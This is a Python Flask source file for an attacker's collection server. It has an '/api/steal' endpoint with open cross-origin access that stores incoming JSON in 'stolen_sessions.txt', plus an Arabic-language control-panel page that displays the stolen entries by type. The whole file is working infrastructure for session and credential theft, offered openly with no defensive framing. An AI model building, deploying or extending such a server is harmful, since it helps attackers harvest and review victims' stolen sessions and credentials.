import os
from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

DATA_FILE = "stolen_sessions.txt"

DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>لوحة التحكم</title>
    <style>
        body { background-color: #030305; color: #00E5FF; font-family: sans-serif; padding: 20px; }
        h1 { color: #FFD700; text-align: center; }
        .card { background-color: #0E0E14; border: 1px solid #00E5FF; border-radius: 10px; padding: 15px; margin-bottom: 15px; word-wrap: break-word; }
        .type { color: #FFD700; font-weight: bold; }
        .data { color: #FF1744; font-family: monospace; }
    </style>
</head>
<body>
    <h1>🕵️ لوحة التحكم</h1>
    <div id="data">
        {% for item in data %}
            <div class="card">
                <div class="type">🔑 النوع: {{ item.type }}</div>
                <div class="data">📦 البيانات: {{ item.data }}</div>
            </div>
        {% else %}
            <p>لسا ما في بيانات.</p>
        {% endfor %}
    </div>
</body>
</html>
"""

@app.route('/api/steal', methods=['POST', 'OPTIONS'])
def steal_data():
    if request.method == 'OPTIONS':
        return '', 200
    data = request.json
    print(f"[+] Received: {data}")
    with open(DATA_FILE, "a") as f:
        f.write(json.dumps(data) + "\n")
    return jsonify({"status": "success"}), 200

@app.route('/')
def dashboard():
    data_list = []
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            for line in f:
                try:
                    data_list.append(json.loads(line))
                except: pass
    return render_template_string(DASHBOARD_HTML, data=data_list[::-1][:50])

if __name__ == '__main__':
    import json
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
